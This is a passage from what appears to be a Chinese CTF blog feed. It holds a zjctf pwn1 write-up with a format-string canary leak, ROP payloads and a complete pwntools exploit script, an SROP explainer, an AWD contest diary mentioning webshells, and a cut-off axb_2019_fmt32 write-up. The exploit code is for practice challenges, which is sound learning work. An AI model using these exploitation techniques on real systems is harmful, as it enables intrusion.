class="keyword">char</span> v12; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v14; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v18; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v22; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v22 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">32</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">21</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">1</span>;</span><br><span class="line">  v13 = <span class="number">59</span>;</span><br><span class="line">  v14 = <span class="number">6</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">2147418112</span>;</span><br><span class="line">  v4 = <span class="number">4</span>;</span><br><span class="line">  v5 = &amp;v6;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v4);</span><br><span class="line">  welcome(<span class="number">22LL</span>, <span class="number">2LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>别的可能会有些许差异，但是它调用了<code>prctl</code>函数我们就要有所警惕了，就要想它应该开了沙箱保护。用<code>seccomp-tools</code>查<code>elf</code>的沙箱保护，发现该elf禁用了<code>execve</code>系统调用。</p><p><img src="https://i.loli.net/2021/07/15/FrlJvebK4ugTW63.png" alt="zjctf pwn1_1.png"></p><p>这个保护的开启就相当于断绝了我们调用<code>system</code>的绝大部分的命令，诸如<code>/bin/sh</code>或者是<code>cat flag</code>这类的。对于这个我们也是有应对措施的，那就是<code>orw</code>(<code>open</code>-<code>read</code>-<code>write</code>的缩写)。这一题很明显就是要我们用这个方法去获取<code>flag</code>了。</p><h2 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h2><p>确定好思路之后进<code>welcome()</code>函数寻找漏洞点。</p><p><img src="https://i.loli.net/2021/07/15/p7gRyNJAQ18sIZm.png" alt="zjctf pwn1_2.png"></p><p>很明显存在格式化字符串漏洞和栈溢出漏洞，而plt表段存在<code>_stack_chk_fail</code>函数，那就是开了<code>canary</code>保护，那么我们肯定是先利用格式化字符串任意读的特性泄露<code>canary</code>，再栈溢出。</p><h3 id="canary偏移确定"><a href="#canary偏移确定" class="headerlink" title="canary偏移确定"></a>canary偏移确定</h3><p>首先是看字符串相对于格式化字符串第一个参数的偏移。因为<code>buf</code>刚好在<code>welcome</code>函数的缓冲区顶部，因此很容易可以猜测<code>buf</code>距离第一个参数差了6*8个字节，因为它们中间隔了5个寄存器。然后<code>buf</code>到栈底又有<code>0xb0</code>个字节，而canary就在rsp-8的位置上。综上所述，canary应该在printf除了格式化字符串参数以外的第<code>(6x8+0xb0-8)/8=27</code>，所以第一次的<code>payload</code>我们就给<code>%27$p</code>，看看输出的是不是<code>canary</code>有如下特性：</p><p>①随机性，每次运行差别都会很大</p><p>②最低位字节永远为\0</p><p><img src="https://i.loli.net/2021/07/15/SCzM9NT2cauwPOo.png" alt="zjctf pwn1_3.png.png"></p><p>多次测试发现均符合上面两个特性，因此canary就被泄露出来了。</p><p>我们接收的是数字组成的字节，因此我们会接收到16个16进制的数，然后字节转成数值后用p64转为字节就可以利用<code>canary</code>了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Welcome! What is your name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br></pre></td></tr></table></figure><p>这就是第一步的<code>payload</code></p><h2 id="栈溢出泄露libc"><a href="#栈溢出泄露libc" class="headerlink" title="栈溢出泄露libc"></a>栈溢出泄露libc</h2><p>题目中存在输出函数<code>puts</code>。</p><p>这个用一般的payload就可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(buf_size-<span class="number">8</span>)+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+P64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br></pre></td></tr></table></figure><p>泄露完成之后记得重新执行<code>welcome</code>实现二次溢出执行一些libc的函数，因为我们不需要<code>system</code>，只需要<code>orw</code>，在已有的函数中就缺一个<code>open</code>函数。找到偏移得到open的真实地址。因为我只能本地复盘，又没有加载它给的libc，因此偏移只能是我自己本地调试是多少就是多少了。</p><h2 id="open函数的调用"><a href="#open函数的调用" class="headerlink" title="open函数的调用"></a>open函数的调用</h2><p>open函数只需要两个就能完成，一个是<code>&quot;flag&quot;</code>或者是<code>&quot;flag.txt&quot;</code>，另一个参数就是<code>&quot;r&quot;</code>或者是0。而只有栈是我们可读可写可以随意控制的，因此我们还需要泄露栈地址。泄露栈地址与泄露canary思路是一样的，可以用格式化字符串的任意写和C字符串的判定方式来泄露存储在栈中的<code>rbp</code>，这里已经有了格式化字符串漏洞，因此我们可以在<code>payload1</code>加上一个格式化字符来多泄露一个<code>rbp</code>。</p><p><code>gdb</code>是个好东西，用它来调试一下。因为我们的<code>rop</code>链是执行到<code>welcome</code>的那个地方才是栈底，所以我们泄露那边的<code>rsp</code></p><p><img src="https://i.loli.net/2021/07/16/pjHAqX3LF6T5iM7.png" alt="zjctf pwn1_4.png"></p><p>那边的<code>rbp</code>刚好是我们新的<code>welcome</code>函数的栈底，讲的通俗点上面就是<code>canary</code>了。</p><p>所以我们的payload和对应的接受输出的措施就可以改成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%27$p %31$p&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure><p>然后我们就可以在下一次的<code>payload</code>里面输入<code>flag</code>字符串并且根据地址去引用它。首先还是老样子把<code>canary</code>泄露出来，然后<code>open</code>函数去打开<code>flag</code>文件。这里我的做法是把<code>flag</code>输出到了后面，但其实可以在前面就把<code>flag</code>字符串放上去，那样偏移还是固定的，而放在后面的话还得根据<code>rop</code>链的长度判断地址。但是思路是这么个思路，可以想一下万一缓冲区没给够，还得输出在后面的时候该用什么措施应对。这里有一个很好用的东西就是<code>ljust</code>固定<code>rop</code>链大小然后再去写。</p><p>这里我给了<code>0xb0</code>的长度去写rop链，先一步步来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span></span><br></pre></td></tr></table></figure><p>这一部分输入之后<code>gdb</code>调试看看能不能成功打开<code>flag</code>文件。</p><p><img src="https://i.loli.net/2021/07/16/3cn94oHrGYumJR5.png" alt="zjctf pwn1_5.png"></p><p>可以看到已经成功把<code>rdi</code>的值变成了<code>flag</code>字符串了，后面一步也是直接执行了<code>open</code>函数。接着调试发现<code>open</code>返回值为3，说明该文件描述符为3，等一下<code>read</code>里面的<code>fd</code>参数就应该给3了。因为这里有三个参数，前两个寄存器的gadget很容易找得到，第三个rdx相关的gadget是死活找不到。这样的话有三种应对措施</p><p>①ret2csu，这个方法套一下模板和容易就可以执行了这个read。</p><p>②去libc中找到rdx相关的gadget，这是官方放出的wp的思路。</p><p>③我另辟蹊径，开辟出第三种方法，这个是一个小技巧，可以记一下：在调用<code>strcmp</code>函数的时候，rdx的值会变成两个字符串中第一个不同字符的第二个字符串对应位置的<code>ascii</code>值。举个栗子，如果我调用strcmp(“aaa”,”abc”)的话，结束的时候rdx的值为’b’。</p><p>这里我用了第三种方法。那么接下来的payload就是这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/16/IvO5gMmzlTKrU6Z.png" alt="zjctf pwn1_6.png"></p><p>继续运行下去可以发现read成功地把我本地的flag文件读到了栈上面</p><p><img src="https://i.loli.net/2021/07/16/1zQqSBaEGswuAgp.png" alt="zjctf pwn1_7.png"></p><p>最后一步应该很简单，就是把那个地方的字符串puts出来，因为在调试器里面我们能看到这个flag，但是打远程的时候我们肯定要输出出来才能看到这串flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">、payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    +p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br></pre></td></tr></table></figure><p>怎么说呢？难是很难，但是确实收获很多，如果想试试这题的师傅们可以直接联系我qq找我要。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">puts=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x400943</span></span><br><span class="line">welcome=<span class="number">0x400726</span></span><br><span class="line">pop_rsi_pop=<span class="number">0x400941</span></span><br><span class="line">read=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p\n%31$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rbp=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(welcome)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;you?&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=(u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">op=puts_addr+<span class="number">0x898b0</span></span><br><span class="line">strcmp=puts_addr+<span class="number">0xff5c0</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%27$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary=p64(<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">b&#x27;a&#x27;</span>+canary+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+(p64(pop_rsi_pop)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(op)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb9</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(strcmp)</span><br><span class="line">    +p64(pop_rsi_pop)+p64(rbp+<span class="number">0xb8</span>)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)+p64(read)</span><br><span class="line">    +p64(pop_rdi)+p64(rbp+<span class="number">0xb8</span>)+p64(puts_addr)</span><br><span class="line">    ).ljust(<span class="number">0xb0</span>,<span class="string">b&#x27;a&#x27;</span>)+<span class="string">b&#x27;flag\0&#x27;</span>+<span class="string">b&#x27;a\0&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SROP</title>
      <link href="/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/06/29/SROP%E5%AD%A6%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>今天开始以学习了花式的栈溢出ROP攻击，BROP这个东西朴实无华且用处不大，思想能了解，但是现在谁打个pwn还不给elf呢，不给libc文件都会被喷死，还敢不给elf？因此跳过这个学习一下SROP。</p><span id="more"></span><p>SROP主要攻击方式就是针对linux系统调用的一个弱点进行攻击的，在进行系统调用的时候，内核会发出signal挂起我们正在运行的程序，并且保存上下文（上下文即所有寄存器的值），然后这个上下文还是以一个结构体的形式存在于栈里面的。此时从用户态切换到内核态，说明现在在执行系统调用，执行完成系统调用的时候会进行系统调用的返回，这个返回又要调用15号的系统调用，恢复上下文并且切换到用户态。这样子系统调用的方法有一个弱点就是，如果我控制了栈，在它挂起的时候我偷偷修改rip=syscall,rax=59(execeve的系统调用号),rdi=”/bin/sh”,rsi=0,rdx=0。那么在结束系统调用的时候就会执行execeve(“/bin/sh”)打开一个shell。</p><p>在就是说在结束系统调用的时候会进行这么一个系统调用，那么如果我本身没有系统调用而调用了这个系统调用会怎么样呢？答案是还会把栈顶的上下文给返回，当然没有精心构造过栈而直接调用肯定是会出错的。攻击的时候我就让它准备好dl_sigreturn的系统调用，然后在预期的栈顶构造一个只执行execeve(“/bin/sh”)的上下文，那么就可以直接完成打开shell的攻击。</p><p>以上都是我根据srop以及一些师傅的资料自己理解的，如有错误那挺正常的，也请师傅们能指出我的错误，感激不尽。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021华东南赛区国赛线下赛</title>
      <link href="/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
      <url>/2021/06/19/%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>这两天来到了福州打awd的线下赛，这是我第一次打awd，收获很多。</p><span id="more"></span><p>先说一下大体的感想，awd真的比ctf好玩太多了，awd能真正体会到那么多网络安全爱好者相互网络攻击的那种乐趣。</p><p>首先入场开始比赛的时候真的是啥也不知道，不过好在有学长带队，啥也不会的我终于在第三轮的时候连上了自己的靶机hhh。学长是打web的，但是在场的web师傅都太厉害了，上的不死马不仅让我们队的靶机down机还不停地拿flag，甚至最后删库都阻止不了他们拿flag。</p><p>咱们第一天的web三题有一题不停地down机又被打，在下午，也是第24，25轮的时候有人ddos题目让所有人都down机了，主办方重启环境还恢复了配置，这可以说是让我们捡了一个漏，因为相当于是帮我们修好了环境，题目上线的时候果断删库，及时保住了一些分，与此同时通过查流量以及不停地测试也是把pwn题的payload给拿到了，因为整个pwn题的输入就是一个0x2000字节的read，查流量也不是很难。但是由于师傅们上午就pwn出了第一道，我也是在不停地堵pwn的漏洞，到最后给自己弄down机了，删库还是没用，依然被打，所以下午我打算不补pwn题让他们随便打了，这波至少赚了几千分。</p><p>第二天的pwn两题都很简单，依然查流量包抄的payload拿下了大部分队伍的pwn分数，修洞的时候又不小心down了，还被打，我就又删库，可是还是有人打，结果最后就是环境恢复不了，全场就咱们队oop那道pwn题down了。最关键是down就down了，还有人打就无语了。。唯一的一道web题依然中了不死马导致又down又被打，每轮稳定扣500分(web 又down又被打，pwn1又down又被打，pwn2一直被打)，还好pwn 多数队伍没有补，最基本的几百分还是能填上坑的。上午从rk40冲进了rk33，rk33是稳稳地三等奖，但是自从少数师傅修好了pwn题局势就开始不妙了，本来我打死不想修的，但是看到有些队伍修成功了我不禁又被诱惑了，但是结果还是不随人愿。所以pwn2我就没有去修了。最终榜上rk36，那都是非常卡奖项的一个位置。因为三等奖是40%-60%。首先得刚好60%*60队=36队。但是有队伍没去比赛要扣名额就比较危险了。最终不知是主办方还是按照60队60%比例算了还是前面队伍有人ddos或者上通防被查了我们还是很幸运地挤进了三等奖的最后一个名额，这是最最最开心的。</p><p>当然本次线下awd收获的经验也是非常多的，比如前面复盘介绍的pwn题被check down 的原因是:未给权限，也是linux基础不牢吧。前几次patch的elf文件守住了两轮，之后还是被打。昨晚我苦思冥想想了很久，问了很多师傅，最终N0vice师傅一语点通了发生的一切自己解释不了的事。第一次patch的elf文件是直接覆盖的，因此权限维持相同，并且很多师傅拿通用脚本打不通我的靶机，机子也没有check down。后来被打是因为真的有人无聊开始拿payload直接nc 去连接维持一个shell权限，我以为是被打通了接着换方式patch，殊不知靶机上面又几页的shell进程留在那边，这是我真没想到的。我还以为是我patch的有问题，就删文件上传，结果权限不够导致无法通过check down，与此同时还有队伍留了shell进程一直被打。</p><p>awd比赛真的太好玩了，期待下次的awd比赛。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axb_2019_fmt32 wp</title>
      <link href="/2021/06/08/axb_2019_fmt32%20wp/"/>
      <url>/2021/06/08/axb_2019_fmt32%20wp/</url>
      
        <content type="html"><![CDATA[<p>临近期末考试了，终于可以光明正大地水博客了。</p><span id="more"></span><p>最近刚写上格式化字符串的漏洞，这不，他来了。这个题目我做过之后感觉难度还是有的，做出这一题至少对格式化字符串漏洞的利用是有一个较深的理解了的。它综合考察了<code>ret2libc</code>和格式化字符串的任意写，以及对got表的理解。</p><h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a><a href="https://buuoj.cn/challenges#axb_2019_fmt32">axb_2019_fmt32</a></h2><p>下载文件，反汇编打开，再反编译<code>main()</code>函数得到如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找字符串并没有发现<code>flag</code>,<code>/bin/sh</code>等字眼，plt表也没有装载<code>system</code>函数，那就分析main函数，一个很明显的格式化字符串漏洞<code>printf(format);</code> <code>format</code>是由我们控制的，首先清楚一点，程序采取read函数读取我们的输入，大小卡的也很死，无法溢出。</p><h3 id="泄露libc地址的准备"><a href="#泄露libc地址的准备" class="headerlink" title="泄露libc地址的准备"></a>泄露libc地址的准备</h3><p>那么我们第一步肯定也是泄露libc的地址，不能溢出那就不能构造rop链去输出，只能用程序本身的printf去输出。我们目前能确定的只有libc函数got表地址，而got表地址的值装的才是libc函数的地址。通俗点讲我现在知道一个地址，但是我要的是这个地址的值。<code>%d %x %f</code>那些都是你传什么就输出什么。举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">0xdeadbeef</span>;</span><br><span class="line"><span class="comment">//假设&amp;a=0x61616161</span></span><br><span class="line"><span class="keyword">int</span> b=&amp;a;</span><br></pre></td></tr></table></figure><p>当热这种写法是错的，但是逻辑应该都能理解的。如果我知道b的值了，那么我如何知道b的值所代表的地址的值呢，如果<code>printf(&quot;%d&quot;,b);</code>的话，那么你只能得到<code>0x61616161</code>而得不到你想要的<code>0xdeadbeef</code>，这个时候就要提到一个知识点了:字符串传参，我在之前的博客应该也有所讲过，字符串传参是用指针传的。因为字符串是大端序，所以一个指针的字符串判定是从这个指针开始一直到下一个<code>&#39;\0&#39;</code>字节(向高地址)为这个指针代表的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 